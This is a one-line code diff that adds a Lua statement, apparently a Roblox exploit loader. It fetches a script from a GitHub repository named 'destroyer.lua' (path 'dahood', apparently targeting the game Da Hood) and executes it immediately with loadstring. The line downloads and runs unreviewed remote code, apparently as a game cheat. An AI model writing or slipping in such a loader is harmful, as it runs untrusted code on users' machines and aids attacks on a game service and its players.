@@ -1,0 +1,1 @@
+loadstring(game:HttpGet"https://raw.githubusercontent.com/Vast1337/destroyer.lua/main/dahood")()
